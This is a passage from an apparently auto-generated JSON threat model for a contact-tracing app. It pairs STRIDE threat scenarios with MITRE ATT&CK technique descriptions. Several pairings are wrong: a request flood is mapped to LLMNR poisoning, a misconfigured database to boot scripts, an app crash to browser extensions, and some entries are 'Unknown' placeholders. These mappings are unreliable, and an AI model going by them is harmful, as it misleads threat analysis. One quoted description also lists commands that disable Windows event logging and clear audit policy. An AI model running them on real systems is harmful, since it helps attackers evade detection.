            "Potential Impact": "Capturing sensitive health data and potentially altering communication content.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "man-in-the-middle",
                "mobile",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses stolen credentials to access the application as a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication mechanisms",
                    "Role": "App Developer",
                    "Condition": "The app does not enforce multi-factor authentication"
                },
                {
                    "Assumption": "User credentials are stored insecurely",
                    "Role": "App Developer",
                    "Condition": "Credentials are saved in plaintext or insecurely"
                },
                {
                    "Assumption": "Users reuse passwords across multiple services",
                    "Role": "User",
                    "Condition": "The same password is used across different platforms"
                }
            ],
            "Potential Impact": "Unauthorized data access and potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "credential theft",
                "credential reuse",
                "data access",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the mobile application's code to extract sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Source code is not obscured",
                    "Role": "App Developer",
                    "Condition": "Application code is easily readable and modifiable"
                },
                {
                    "Assumption": "Weak checks on application integrity",
                    "Role": "App Developer",
                    "Condition": "No tooling to detect tampered applications"
                },
                {
                    "Assumption": "Attacker has physical access to user devices",
                    "Role": "Attacker",
                    "Condition": "Devices are left unattended"
                }
            ],
            "Potential Impact": "Compromised data integrity and unauthorized data exploitation.",
            "MITRE ATT&CK Keywords": [
                "code tampering",
                "data leakage",
                "mobile",
                "application"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker places malicious updates on the server, altering application behavior.",
            "Assumptions": [
                {
                    "Assumption": "Lack of rigorous update verification process",
                    "Role": "App Developer",
                    "Condition": "Updates are not signed or verified"
                },
                {
                    "Assumption": "Insufficient server security measures",
                    "Role": "Server Admin",
                    "Condition": "Server access control measures are weak"
                },
                {
                    "Assumption": "Automatic update mechanisms are enabled",
                    "Role": "User",
                    "Condition": "App auto-updates without user intervention"
                }
            ],
            "Potential Impact": "Corrupted app functionality and compromised user data.",
            "MITRE ATT&CK Keywords": [
                "update tampering",
                "system corruption",
                "mobile",
                "server"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data being transmitted from the mobile device to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted data transmission",
                    "Role": "App Developer",
                    "Condition": "Data is transmitted without encryption"
                },
                {
                    "Assumption": "Lack of data integrity checks",
                    "Role": "App Developer",
                    "Condition": "No mechanisms in place to verify data authenticity"
                },
                {
                    "Assumption": "Attacker has access to the network path",
                    "Role": "Attacker",
                    "Condition": "Network communication can be intercepted"
                }
            ],
            "Potential Impact": "Compromised data integrity and false exposure warnings.",
            "MITRE ATT&CK Keywords": [
                "data integrity",
                "network tampering",
                "mobile",
                "interception"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having received exposure notifications to avoid quarantine.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient audit trails",
                    "Role": "App Developer",
                    "Condition": "No logging of notification deliveries"
                },
                {
                    "Assumption": "No delivery confirmations",
                    "Role": "App Developer",
                    "Condition": "Lack of mechanisms to confirm notification receipt"
                },
                {
                    "Assumption": "Users\u2019 devices do not log interactions",
                    "Role": "User",
                    "Condition": "Devices do not keep records of interaction history"
                }
            ],
            "Potential Impact": "Potential for false claims and non-compliance with health guidelines.",
            "MITRE ATT&CK Keywords": [
                "audit bypass",
                "notification denial",
                "mobile",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies uploading positive test results data, hindering contact tracing efforts.",
            "Assumptions": [
                {
                    "Assumption": "Weak upload confirmation process",
                    "Role": "App Developer",
                    "Condition": "No confirmation for data uploads"
                },
                {
                    "Assumption": "No strong enforcement of data submission",
                    "Role": "Healthcare Authority",
                    "Condition": "Submission of data not strictly regulated"
                },
                {
                    "Assumption": "Users have control over their data submission",
                    "Role": "User",
                    "Condition": "Users can choose to omit data submission"
                }
            ],
            "Potential Impact": "Ineffective contact tracing and increased spread of the virus.",
            "MITRE ATT&CK Keywords": [
                "data denial",
                "upload repudiation",
                "mobile",
                "data submission"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies being aware of consent given to track and store their data.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate consent logging",
                    "Role": "App Developer",
                    "Condition": "Consents are not logged properly"
                },
                {
                    "Assumption": "No clear user agreements",
                    "Role": "App Developer",
                    "Condition": "Terms and consent forms are unclear or not emphasized"
                },
                {
                    "Assumption": "Users do not read terms of service",
                    "Role": "User",
                    "Condition": "Users ignore terms presented during installation"
                }
            ],
            "Potential Impact": "Potential legal issues and breach of trust with users.",
            "MITRE ATT&CK Keywords": [
                "consent denial",
                "logging",
                "mobile",
                "privacy"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--64e998d8-ab3e-4123-93fb-eccaa6b9714a",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to health and location data stored on the server.",
            "Assumptions": [
                {
                    "Assumption": "Weak server security",
                    "Role": "Server Admin",
                    "Condition": "Server has inadequate security configurations"
                },
                {
                    "Assumption": "No encryption for stored data",
                    "Role": "App Developer",
                    "Condition": "Data is stored in plaintext"
                },
                {
                    "Assumption": "Malware infects server systems",
                    "Role": "Attacker",
                    "Condition": "Servers are vulnerable to malware"
                }
            ],
            "Potential Impact": "Confidentiality breaches leading to privacy violations of numerous users.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "unauthorized access",
                "server",
                "health data"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Interception of data transmitted between the application and the server exposes PII (Personally Identifiable Information).",
            "Assumptions": [
                {
                    "Assumption": "Data is not encrypted during transmission",
                    "Role": "App Developer",
                    "Condition": "Data sent in plaintext"
                },
                {
                    "Assumption": "User devices connect via insecure networks",
                    "Role": "User",
                    "Condition": "Users connect through unsecured Wi-Fi networks"
                },
                {
                    "Assumption": "Man-in-the-middle attack possible",
                    "Role": "Attacker",
                    "Condition": "Attacker can capture network traffic"
                }
            ],
            "Potential Impact": "Exposure of users' PII and sensitive health information.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "PII exposure",
                "network",
                "mobile"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A misconfigured database allows public access to sensitive contact tracing information.",
            "Assumptions": [
                {
                    "Assumption": "Database misconfigurations exist",
                    "Role": "Server Admin",
                    "Condition": "Improper database access settings"
                },
                {
                    "Assumption": "No frequent audits",
                    "Role": "IT Security",
                    "Condition": "Lack of regular database security audits"
                },
                {
                    "Assumption": "Default database credentials used",
                    "Role": "Server Admin",
                    "Condition": "Database using default credentials"
                }
            ],
            "Potential Impact": "Unintended public access to sensitive user information.",
            "MITRE ATT&CK Keywords": [
                "database misconfiguration",
                "unauthorized access",
                "data leak",
                "server"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the central server with requests, causing service outages.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting",
                    "Role": "App Developer",
                    "Condition": "Server does not limit request rates"
                },
                {
                    "Assumption": "Weak network defense",
                    "Role": "IT Security",
                    "Condition": "Insufficient network-level protections against floods"
                },
                {
                    "Assumption": "The app is heavily dependent on the central server",
                    "Role": "System Architect",
                    "Condition": "Application relies on central server for critical operations"
                }
            ],
            "Potential Impact": "Reduced availability of the contact tracing service, impacting users' ability to receive timely notifications.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "flood attack",
                "network",
                "server"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker deploys malware to cripple user devices essential for running the app.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack antivirus",
                    "Role": "User",
                    "Condition": "Devices are not protected by antivirus software"
                },
                {
                    "Assumption": "The app cannot function on infected devices",
                    "Role": "App Developer",
                    "Condition": "The application crashes or is disabled by malware"
                },
                {
                    "Assumption": "Mass infection spread",
                    "Role": "Attacker",
                    "Condition": "The malware spreads quickly between devices"
                }
            ],
            "Potential Impact": "Disruption in users' ability to access and use the contact tracing application.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "device failure",
                "mobile",
                "disruption"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits system vulnerabilities to crash the app, rendering it unusable.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched vulnerabilities",
                    "Role": "App Developer",
                    "Condition": "Known vulnerabilities are not patched"
                },
                {
                    "Assumption": "No efficient monitoring",
                    "Role": "IT Security",
                    "Condition": "Lack of system health monitoring"
                },
                {
                    "Assumption": "Weak exception handling in code",
                    "Role": "App Developer",
                    "Condition": "Application does not handle unexpected errors well"
                }
            ],
            "Potential Impact": "Interruption of the contact tracing service, which can delay or prevent exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "app crash",
                "system failure",
                "mobile"
            ],
            "mitre_technique": {
                "name": "Browser Extensions",
                "description": "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension)\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation: Stantinko Botnet)(Citation: Chrome Extension C2 Malware) Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls for [Defense Evasion](https://attack.mitre.org/tactics/TA0005).(Citation: Browers FriarFox)(Citation: Browser Adrozek) ",
                "id": "attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8",
                "technique_id": "T1176"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious user gains root access to devices and installs unauthorized applications.",
            "Assumptions": [
                {
                    "Assumption": "Device vulnerabilities exist",
                    "Role": "Device Manufacturer",
                    "Condition": "Vulnerabilities are present in the OS"
                },
                {
                    "Assumption": "No effective app permissions management",
                    "Role": "App Developer",
                    "Condition": "Application permissions are not granular"
                },
                {
                    "Assumption": "User awareness is low",
                    "Role": "User",
                    "Condition": "Users are not aware of potential security risks"
                }
            ],
            "Potential Impact": "Complete control over user devices, enabling the extraction or manipulation of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "root access",
                "device control",
                "privilege escalation",
                "mobile"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a server vulnerability to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Server software vulnerabilities",
                    "Role": "Server Admin",
                    "Condition": "Running outdated or vulnerable software versions"
                },
                {
                    "Assumption": "Weak server configuration",
                    "Role": "Server Admin",
                    "Condition": "Servers are not securely configured"
                },
                {
                    "Assumption": "Lack of proper monitoring",
                    "Role": "IT Security",
                    "Condition": "No continuous monitoring and alerting"
                }
            ],
            "Potential Impact": "Unauthorized manipulation of server data and operations.",
            "MITRE ATT&CK Keywords": [
                "server hijack",
                "admin access",
                "privilege escalation",
                "server"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
